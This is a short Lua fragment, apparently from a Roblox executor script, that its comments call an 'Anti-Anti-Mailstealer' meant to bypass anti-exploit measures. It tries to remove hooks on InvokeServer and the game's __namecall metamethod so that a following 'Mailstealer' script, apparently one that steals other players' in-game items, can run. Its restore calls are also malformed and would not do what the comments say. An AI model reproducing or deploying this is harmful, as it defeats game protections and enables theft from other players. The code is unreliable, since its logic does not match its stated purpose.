...
-- Anti-Anti-Mailstealer Script to bypass anti-exploit measures

-- Restore original functions
local genv = getgenv()
local renv = getrenv()

local unhook = genv and genv.hookfunction or function(...) return ... end
local unhookmeta = genv and genv.hookmetamethod or function(...) return ... end

-- Restore original InvokeServer
local original_invoke = renv.Instance.new("RemoteFunction").InvokeServer
unhook(original_invoke)

-- Restore original __namecall
local mt = getrawmetatable(game)
local old_namecall = mt.__namecall
unhookmeta(game, "__namecall", old_namecall)

-- Original Mailstealer Script continues here
